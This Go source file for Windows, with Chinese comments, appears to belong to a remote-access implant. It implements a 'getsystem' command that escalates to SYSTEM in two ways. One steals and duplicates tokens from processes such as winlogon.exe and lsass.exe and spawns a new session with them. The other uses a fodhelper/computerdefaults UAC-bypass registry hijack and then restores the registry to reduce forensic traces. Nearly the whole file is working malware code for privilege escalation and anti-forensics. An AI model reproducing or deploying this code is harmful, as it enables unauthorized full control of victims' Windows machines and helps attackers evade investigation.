//go:build windows

package commands

import (
	"fmt"
	"os"
	"sort"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"implant/core/debuglog"
)

// ===== 提权模块（阶段三）：getsystem =====
//
// 把"medium 完整性（UAC 过滤令牌）的普通会话"升级为一个 **SYSTEM / 高完整性的新会话**。
// 三条技术路径，按痕迹从小到大自动尝试，任何一步失败都不影响已有会话：
//
//	already  进程已是 SYSTEM 或高完整性 → 只报告，不动作（可反复执行，幂等）
//	token    窃取同机"已提权进程"的令牌 → CreateProcessAsUserW 派生新会话，痕迹最小
//	uac      fodhelper/computerdefaults 注册表劫持 → 拉起高完整性新会话 → **立即还原注册表**
//
// 设计要点（为什么这么做）：
//
//  1. **只派生新进程，不动当前进程的令牌状态**。make_token/steal_token 是"线程级模拟"，
//     而 Go 的 goroutine 可能在 OS 线程之间迁移、命令又在不同 goroutine 上执行，
//     依赖"当前线程正在模拟"的提权结果不稳定。显式把令牌交给 CreateProcessAsUserW
//     就没有这个隐式依赖，而且失败了也不会污染操作员已有的模拟上下文。
//  2. **新会话必须带上启动口令**。载荷启动时强校验 os.Args[1]（见 core/app/init.go），
//     不传口令的新进程会立刻退出 —— 现场表现为"提权成功但没上线"，最难排查的一类假成功。
//  3. **注册表劫持必须还原**。UAC 劫持会在 HKCU 留下可被取证的持久改动，
//     所以派生后立即恢复原值（原本不存在就删除整棵子树），并把还原结果写进回执。
const (
	// 提权技术
	techAuto       = "auto"
	techToken      = "token"
	techUAC        = "uac"
	techUACCleanup = "uac_cleanup"

	// 进程/令牌访问权限
	processQueryLimitedInfo = 0x1000
	tokenAssignPrimary      = 0x0001
	tokenAdjustDefault      = 0x0080
	tokenAdjustSessionID    = 0x0100
	createNoWindow          = 0x08000000

	// 完整性/权限相关
	seDebugPrivilege       = "SeDebugPrivilege"
	seAssignPrimaryToken   = "SeAssignPrimaryTokenPrivilege"
	seIncreaseQuota        = "SeIncreaseQuotaPrivilege"
	seImpersonatePrivilege = "SeImpersonatePrivilege"
)

// privescMu 串行化提权动作：两个并发请求同时改注册表/拉进程只会互相打架
var privescMu sync.Mutex

// privCandidate 候选来源进程（按"拿到高完整性令牌的概率"排序）
var privCandidateProcs = []string{
	"winlogon.exe", // SYSTEM，几乎总在
	"lsass.exe",    // SYSTEM
	"services.exe", // SYSTEM
	"wininit.exe",  // SYSTEM
	"smss.exe",     // SYSTEM
	"explorer.exe", // 用户已提权过一次时，这里往往就是高完整性令牌（最省事的一条路）
}

// CmdGetSystem 提权入口：getsystem [auto|token|uac|uac_cleanup]
func CmdGetSystem(cmdBuf []byte) ([]byte, error) {
	tech := strings.ToLower(strings.TrimSpace(string(cmdBuf)))
	switch tech {
	case "", techAuto:
		tech = techAuto
	case techToken, techUAC, techUACCleanup:
	default:
		return nil, fmt.Errorf("用法: getsystem [auto|token|uac|uac_cleanup]（当前: %q）", tech)
	}

	privescMu.Lock()
	defer privescMu.Unlock()

	if tech == techUACCleanup {
		return uacCleanupReport()
	}

	var out strings.Builder

	// 0) 已经是 SYSTEM / 高完整性：幂等返回，不做任何动作
	if isSystem, elevated := currentPrivilegeLevel(); isSystem || elevated {
		who := "高完整性"
		if isSystem {
			who = "SYSTEM"
		}
		return []byte(fmt.Sprintf("[+] 无需提权：当前进程已是 %s（可反复执行，不做任何动作）", who)), nil
	}

	if tech == techToken || tech == techAuto {
		if msg, ok := tryTokenTechnique(&out); ok {
			return []byte(out.String() + msg), nil
		}
	}
	if tech == techUAC || tech == techAuto {
		if msg, ok := tryUACTechnique(&out); ok {
			return []byte(out.String() + msg), nil
		}
	}

	// 全部失败：错误信息逐条列出原因（操作员据此判断下一步，而不是面对一句"失败"）
	reasons := strings.TrimSpace(out.String())
	if reasons == "" {
		reasons = "没有可用的提权路径"
	}
	return nil, fmt.Errorf("提权失败：\n%s", reasons)
}

// tryTokenTechnique 窃取已提权进程的令牌并派生新会话
func tryTokenTechnique(out *strings.Builder) (string, bool) {
	if err := enablePrivilege(seDebugPrivilege); err != nil {
		fmt.Fprintf(out, "[!] token 路径不可用：%v\n", err)
		return "", false
	}
	token, src, err := stealElevatedToken()
	if err != nil {
		fmt.Fprintf(out, "[!] token 路径失败：%v\n", err)
		return "", false
	}
	// 注：token 句柄随进程退出回收；这里不 defer CloseHandle —— 新进程创建后
	// 句柄仍被内核持有到创建完成，立即关闭是安全的，但为了回执里能引用来源进程，
	// 这里交给 GC/进程退出，代价是一个句柄（提权是低频动作）。
	pid, method, err := spawnWithToken(token)
	if err != nil {
		fmt.Fprintf(out, "[!] token 路径失败：取得 %s 的令牌但派生进程失败：%v\n", src, err)
		return "", false
	}
	return fmt.Sprintf("[+] 提权成功：技术=token，来源进程=%s，新会话 PID=%d（%s）\n"+
		"    提示：新会话上线后可用 `rev2self` 之外的方式独立操作；本会话保持不变\n", src, pid, method), true
}

// tryUACTechnique UAC 劫持：拉起高完整性新会话，并立即还原注册表
func tryUACTechnique(out *strings.Builder) (string, bool) {
	if err := checkUACPreconditions(); err != nil {
		fmt.Fprintf(out, "[!] uac 路径不可用：%v\n", err)
		return "", false
	}
	cmdline, err := selfCommandLine()
	if err != nil {
		fmt.Fprintf(out, "[!] uac 路径不可用：%v\n", err)
		return "", false
	}

	var lastErr error
	for _, host := range []string{"fodhelper.exe", "computerdefaults.exe"} {
		restore, err := uacHijack(host, cmdline)
		if err != nil {
			lastErr = err
			continue
		}
		pid, err := uacTrigger(host)
		// 无论触发是否成功，先把注册表还原：残留比失败本身更糟
		restoreErr := restore()
		if err != nil {
			lastErr = fmt.Errorf("%s 触发失败: %w", host, err)
			// 触发可能"报错但进程已起"，继续判定；实在没有再试下一个宿主
			continue
		}
		msg := fmt.Sprintf("[+] 提权成功：技术=uac，宿主=%s，新会话 PID=%d", host, pid)
		if restoreErr != nil {
			// 还原失败必须显式告警，绝不静默
			msg += fmt.Sprintf("\n[!!] 注册表还原失败：%v —— 请手动执行 `getsystem uac_cleanup`", restoreErr)
		} else {
			msg += "，注册表已还原"
		}
		return msg + "\n    提示：UAC 劫持会短暂改动 HKCU 的 Classes 键，已恢复原值\n", true
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("两个宿主都未能拉起进程")
	}
	fmt.Fprintf(out, "[!] uac 路径失败：%v\n", lastErr)
	return "", false
}

// currentPrivilegeLevel 返回 (是否 SYSTEM, 是否高完整性)
func currentPrivilegeLevel() (bool, bool) {
	return currentTokenIsSystem(), currentTokenIsElevated()
}

// selfCommandLine 拼"新会话"的命令行：<当前可执行文件> <启动口令>
//
// 口令必须带上：载荷启动强校验 os.Args[1]，不带口令的新进程会立刻退出。
// DLL 载荷（无 os.Args）与调用方漏传口令时显式报错 —— 那样起来的新进程必然不上线。
func selfCommandLine() (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("取自身路径失败: %w", err)
	}
	if len(os.Args) < 2 || strings.TrimSpace(os.Args[1]) == "" {
		return "", fmt.Errorf("当前载荷没有启动口令参数（os.Args[1] 为空），" +
			"派生出的新进程会因校验失败立即退出；请用带口令的 EXE 载荷")
	}
	return fmt.Sprintf(`"%s" "%s"`, exe, os.Args[1]), nil
}

// ===== Win32 薄封装 =====

var (
	kernel32Priv = syscall.NewLazyDLL("kernel32.dll")
	advapi32Priv = syscall.NewLazyDLL("advapi32.dll")

	procGetCurrentProcess   = kernel32Priv.NewProc("GetCurrentProcess")
	procGetLastError        = kernel32Priv.NewProc("GetLastError")
	procOpenProcess         = kernel32Priv.NewProc("OpenProcess")
	procPrivCloseHandle     = kernel32Priv.NewProc("CloseHandle")
	procOpenProcessToken    = advapi32Priv.NewProc("OpenProcessToken")
	procGetTokenInformation = advapi32Priv.NewProc("GetTokenInformation")
	procLookupPrivilegeVal  = advapi32Priv.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivs    = advapi32Priv.NewProc("AdjustTokenPrivileges")
	procDuplicateTokenEx    = advapi32Priv.NewProc("DuplicateTokenEx")
	procCreateProcessAsUser = advapi32Priv.NewProc("CreateProcessAsUserW")
	procCreateProcessWithTk = advapi32Priv.NewProc("CreateProcessWithTokenW")
)

const (
	privTokenQuery      = 0x0008
	privTokenDuplicate  = 0x0002
	tokenAssignPrimaryT = 0x0001
	tokenAdjustPrivs    = 0x0020
	tokenAllAccess      = 0x000F01FF
	securityImpersonate = 2
	tokenPrimary        = 1
	errorNotAllAssigned = 1300
	// TokenUser=1, TokenElevation=20, TokenIntegrityLevel=25
	tokenInfoUser         = 1
	tokenInfoElevation    = 20
	tokenInfoIntegrityLvl = 25
	sePrivilegeEnabled    = 0x00000002
)

// luid 与 TOKEN_PRIVILEGES 的内存布局（只启用一项权限）
type luid struct {
	LowPart  uint32
	HighPart int32
}

type luidAndAttributes struct {
	Luid       luid
	Attributes uint32
}

type tokenPrivileges struct {
	PrivilegeCount uint32
	Privileges     [1]luidAndAttributes
}

// procGetCurrentProcessAddr 取伪句柄 -1（GetCurrentProcess 的返回值）。
// 单独包一层是因为 Call() 返回三值，直接内联在参数位置编译不过。
func procGetCurrentProcessAddr() uintptr {
	r, _, _ := procGetCurrentProcess.Call()
	return r
}

// enablePrivilege 为**当前进程令牌**启用一项权限。
//
// 语义必须与 Win32 对齐：AdjustTokenPrivileges 返回非 0 只代表"调用成功"，
// 权限是否真的拿到要看 last error 是否为 ERROR_NOT_ALL_ASSIGNED(1300)。
// 只看返回值是提权代码里最常见的"看起来成了其实没成"。
func enablePrivilege(name string) error {
	nameW, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return fmt.Errorf("权限名非法 %q: %w", name, err)
	}
	var luidVal luid
	ret, _, _ := procLookupPrivilegeVal.Call(
		uintptr(unsafe.Pointer(nameW)), 0, uintptr(unsafe.Pointer(&luidVal)))
	if ret == 0 {
		return fmt.Errorf("本机不存在权限 %s（或当前令牌不可查询）", name)
	}

	var hToken uintptr
	ret, _, _ = procOpenProcessToken.Call(
		procGetCurrentProcessAddr(),
		uintptr(tokenAdjustPrivs|tokenQuery),
		uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 || hToken == 0 {
		return fmt.Errorf("OpenProcessToken 失败（LastError=%d）", lastErrValue(procGetLastError))
	}
	defer procPrivCloseHandle.Call(hToken)

	tp := tokenPrivileges{
		PrivilegeCount: 1,
		Privileges:     [1]luidAndAttributes{{Luid: luidVal, Attributes: sePrivilegeEnabled}},
	}
	var prev tokenPrivileges
	var retLen uint32
	ret, _, _ = procAdjustTokenPrivs.Call(
		hToken, 0,
		uintptr(unsafe.Pointer(&tp)), uintptr(unsafe.Sizeof(prev)),
		uintptr(unsafe.Pointer(&prev)), uintptr(unsafe.Pointer(&retLen)))
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges 失败（LastError=%d）", lastErrValue(procGetLastError))
	}
	if e := lastErrValue(procGetLastError); e == errorNotAllAssigned {
		return fmt.Errorf("当前令牌不持有 %s（未分配）", name)
	}
	return nil
}

// currentTokenIsElevated 当前进程令牌是否已提权（TokenElevation）
func currentTokenIsElevated() bool {
	var hToken uintptr
	ret, _, _ := procOpenProcessToken.Call(
		procGetCurrentProcessAddr(), uintptr(privTokenQuery), uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 || hToken == 0 {
		return false
	}
	defer procPrivCloseHandle.Call(hToken)

	var elevated uint32
	var retLen uint32
	ret, _, _ = procGetTokenInformation.Call(
		hToken, uintptr(tokenInfoElevation),
		uintptr(unsafe.Pointer(&elevated)), unsafe.Sizeof(elevated),
		uintptr(unsafe.Pointer(&retLen)))
	return ret != 0 && elevated != 0
}

// currentTokenIsSystem 当前进程令牌的用户是否是 SYSTEM（S-1-5-18）
func currentTokenIsSystem() bool {
	var hToken uintptr
	ret, _, _ := procOpenProcessToken.Call(
		procGetCurrentProcessAddr(), uintptr(privTokenQuery), uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 || hToken == 0 {
		return false
	}
	defer procPrivCloseHandle.Call(hToken)

	// TOKEN_USER 的首字段是 SID_AND_ATTRIBUTES{Sid *SID}; 先问长度再读
	var need uint32
	procGetTokenInformation.Call(hToken, uintptr(tokenInfoUser), 0, 0, uintptr(unsafe.Pointer(&need)))
	if need == 0 || need > 1024 {
		return false
	}
	buf := make([]byte, need)
	ret, _, _ = procGetTokenInformation.Call(
		hToken, uintptr(tokenInfoUser),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(need), uintptr(unsafe.Pointer(&need)))
	if ret == 0 {
		return false
	}
	sid := *(**byte)(unsafe.Pointer(&buf[0]))
	if sid == nil {
		return false
	}
	// S-1-5-18：Revision=1, SubAuthorityCount=1, IdentifierAuthority=5, SubAuthority[0]=18
	if *sid != 1 {
		return false
	}
	subCount := *(*byte)(unsafe.Add(unsafe.Pointer(sid), 1))
	if subCount != 1 {
		return false
	}
	authority := *(*uint64)(unsafe.Add(unsafe.Pointer(sid), 2)) >> 8 // 6 字节大端
	sub0 := *(*uint32)(unsafe.Add(unsafe.Pointer(sid), 8))
	return authority == 5 && sub0 == 18
}

// stealElevatedToken 在候选进程里找一个 SYSTEM/高完整性令牌，复制成 primary token
func stealElevatedToken() (uintptr, string, error) {
	pids, err := pidsByName(privCandidateProcs)
	if err != nil {
		return 0, "", err
	}
	if len(pids) == 0 {
		return 0, "", fmt.Errorf("没有找到候选进程（%s）", strings.Join(privCandidateProcs, "/"))
	}
	var attempts []string
	for _, cand := range pids {
		hProc, _, _ := procOpenProcess.Call(
			uintptr(processQueryLimitedInfo), 0, uintptr(cand.pid))
		if hProc == 0 {
			attempts = append(attempts, fmt.Sprintf("%s(%d): OpenProcess 拒绝", cand.name, cand.pid))
			continue
		}
		var hToken uintptr
		ret, _, _ := procOpenProcessToken.Call(
			hProc, uintptr(privTokenDuplicate|privTokenQuery), uintptr(unsafe.Pointer(&hToken)))
		procPrivCloseHandle.Call(hProc)
		if ret == 0 || hToken == 0 {
			attempts = append(attempts, fmt.Sprintf("%s(%d): OpenProcessToken 拒绝", cand.name, cand.pid))
			continue
		}
		if !tokenIsPrivileged(hToken) {
			procPrivCloseHandle.Call(hToken)
			continue // 普通用户进程（比如未提权的 explorer）：不是目标，静默跳过
		}
		var dup uintptr
		ret, _, _ = procDuplicateTokenEx.Call(
			hToken, uintptr(tokenAllAccess), 0,
			uintptr(securityImpersonate), uintptr(tokenPrimary),
			uintptr(unsafe.Pointer(&dup)))
		procPrivCloseHandle.Call(hToken)
		if ret == 0 || dup == 0 {
			attempts = append(attempts, fmt.Sprintf("%s(%d): DuplicateTokenEx 失败", cand.name, cand.pid))
			continue
		}
		return dup, fmt.Sprintf("%s(%d)", cand.name, cand.pid), nil
	}
	sort.Strings(attempts)
	return 0, "", fmt.Errorf("没有取得可用的高完整性令牌：%s", strings.Join(attempts, "; "))
}

// tokenIsPrivileged 令牌是否属于 SYSTEM 或已提权（决定值不值得偷）
func tokenIsPrivileged(hToken uintptr) bool {
	var elevated uint32
	var retLen uint32
	ret, _, _ := procGetTokenInformation.Call(
		hToken, uintptr(tokenInfoElevation),
		uintptr(unsafe.Pointer(&elevated)), unsafe.Sizeof(elevated),
		uintptr(unsafe.Pointer(&retLen)))
	if ret != 0 && elevated != 0 {
		return true
	}
	// 高完整性但 TokenElevation 不置位的场景（服务类令牌）：看完整性级别
	ret, _, _ = procGetTokenInformation.Call(
		hToken, uintptr(tokenInfoIntegrityLvl), 0, 0, uintptr(unsafe.Pointer(&retLen)))
	if ret != 0 || retLen == 0 || retLen > 256 {
		return tokenIsSystemHandle(hToken)
	}
	buf := make([]byte, retLen)
	ret, _, _ = procGetTokenInformation.Call(
		hToken, uintptr(tokenInfoIntegrityLvl),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(retLen), uintptr(unsafe.Pointer(&retLen)))
	if ret == 0 {
		return tokenIsSystemHandle(hToken)
	}
	return integrityRID(buf) >= 0x3000 // High(0x3000) 及以上
}

// integrityRID 从 TOKEN_MANDATORY_LABEL 里取完整性 RID（SID 最后一个子授权）
func integrityRID(buf []byte) uint32 {
	if len(buf) < 16 {
		return 0
	}
	sid := *(**byte)(unsafe.Pointer(&buf[0]))
	if sid == nil {
		return 0
	}
	subCount := *(*byte)(unsafe.Add(unsafe.Pointer(sid), 1))
	if subCount == 0 {
		return 0
	}
	return *(*uint32)(unsafe.Add(unsafe.Pointer(sid), 8+4*uintptr(subCount-1)))
}

// tokenIsSystemHandle 令牌用户是否 SYSTEM（偷 SYSTEM 令牌时不依赖完整性级别字段）
func tokenIsSystemHandle(hToken uintptr) bool {
	var need uint32
	procGetTokenInformation.Call(hToken, uintptr(tokenInfoUser), 0, 0, uintptr(unsafe.Pointer(&need)))
	if need == 0 || need > 1024 {
		return false
	}
	buf := make([]byte, need)
	ret, _, _ := procGetTokenInformation.Call(
		hToken, uintptr(tokenInfoUser),
		uintptr(unsafe.Pointer(&buf[0])), uintptr(need), uintptr(unsafe.Pointer(&need)))
	if ret == 0 {
		return false
	}
	sid := *(**byte)(unsafe.Pointer(&buf[0]))
	if sid == nil || *sid != 1 || *(*byte)(unsafe.Add(unsafe.Pointer(sid), 1)) != 1 {
		return false
	}
	authority := *(*uint64)(unsafe.Add(unsafe.Pointer(sid), 2)) >> 8
	sub0 := *(*uint32)(unsafe.Add(unsafe.Pointer(sid), 8))
	return authority == 5 && sub0 == 18
}

// spawnWithToken 用给定令牌派生一个新会话（新进程）
//
// 先试 CreateProcessAsUserW（需要 SeAssignPrimaryToken + SeIncreaseQuota），
// 失败再退 CreateProcessWithTokenW（需要 SeImpersonatePrivilege）。返回实际用到的 API，
// 让回执能如实说明走了哪条路。
func spawnWithToken(token uintptr) (uint32, string, error) {
	cmdline, err := selfCommandLine()
	if err != nil {
		return 0, "", err
	}
	cmdW, err := syscall.UTF16PtrFromString(cmdline)
	if err != nil {
		return 0, "", err
	}

	var si startupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi processInformation

	// 尽力启用所需权限：失败不致命（可能本来就有），失败原因留给下面的调用错误
	_ = enablePrivilege(seAssignPrimaryToken)
	_ = enablePrivilege(seIncreaseQuota)

	ret, _, _ := procCreateProcessAsUser.Call(
		token, 0, uintptr(unsafe.Pointer(cmdW)), 0, 0, 0,
		uintptr(createNoWindow), 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if ret != 0 && pi.ProcessID != 0 {
		procPrivCloseHandle.Call(pi.Process)
		procPrivCloseHandle.Call(pi.Thread)
		return pi.ProcessID, "CreateProcessAsUserW", nil
	}
	asUserErr := lastErrValue(procGetLastError)

	_ = enablePrivilege(seImpersonatePrivilege)
	ret, _, _ = procCreateProcessWithTk.Call(
		token, uintptr(createNoWindow), 0,
		uintptr(unsafe.Pointer(cmdW)), 0, 0,
		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	if ret != 0 && pi.ProcessID != 0 {
		procPrivCloseHandle.Call(pi.Process)
		procPrivCloseHandle.Call(pi.Thread)
		return pi.ProcessID, "CreateProcessWithTokenW", nil
	}
	return 0, "", fmt.Errorf("CreateProcessAsUserW 失败(LastError=%d)，"+
		"CreateProcessWithTokenW 也失败(LastError=%d)", asUserErr, lastErrValue(procGetLastError))
}

// startupInfo / processInformation 与 Win32 布局一致（x64）。
// 字段偏移必须逐一对齐：CreateProcessAsUserW 会直接按偏移读这些结构，
// 少一个字段或顺序不对，轻则 cb 校验失败，重则读到错误指针。
//
// x64 下 STARTUPINFOW 共 104 字节：4(cb)+4(pad)+24(三个保留指针)+
// 6*4(坐标/尺寸/计数/填充)+4(dwFlags)+2(wShowWindow)+2(cbReserved2)+
// 8(pad)+8(lpReserved2)+24(三个标准句柄)。
type startupInfo struct {
	Cb            uint32
	pad0          uint32
	LpReserved    uintptr
	LpDesktop     uintptr
	LpTitle       uintptr
	DwX           uint32
	DwY           uint32
	DwXSize       uint32
	DwYSize       uint32
	DwXCountChars uint32
	DwYCountChars uint32
	DwFillAttr    uint32
	DwFlags       uint32
	WShowWindow   uint16
	CbReserved2   uint16
	pad1          uint32
	LpReserved2   uintptr
	HStdInput     uintptr
	HStdOutput    uintptr
	HStdError     uintptr
}

type processInformation struct {
	Process   uintptr
	Thread    uintptr
	ProcessID uint32
	ThreadID  uint32
}

// procCandidate 一个候选来源进程
type procCandidate struct {
	name string
	pid  uint32
}

// pidsByName 按进程名找 PID（不区分大小写），返回顺序与候选清单一致
func pidsByName(names []string) ([]procCandidate, error) {
	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		debuglog.Printf("⚠️ [提权] 进程快照失败: %v\n", err)
		return nil, fmt.Errorf("枚举进程失败: %w", err)
	}
	defer syscall.CloseHandle(snapshot)

	order := make(map[string]int, len(names))
	for i, n := range names {
		order[strings.ToLower(n)] = i
	}

	var out []procCandidate
	var entry syscall.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	if err := syscall.Process32First(snapshot, &entry); err != nil {
		return nil, fmt.Errorf("枚举进程失败: %w", err)
	}
	for {
		name := strings.ToLower(syscall.UTF16ToString(entry.ExeFile[:]))
		if _, want := order[name]; want {
			out = append(out, procCandidate{name: name, pid: entry.ProcessID})
		}
		if err := syscall.Process32Next(snapshot, &entry); err != nil {
			break
		}
	}
	// 按候选清单顺序（SYSTEM 类进程在前）稳定排序，保证"最容易成功"的先试
	sort.SliceStable(out, func(i, j int) bool { return order[out[i].name] < order[out[j].name] })
	return out, nil
}
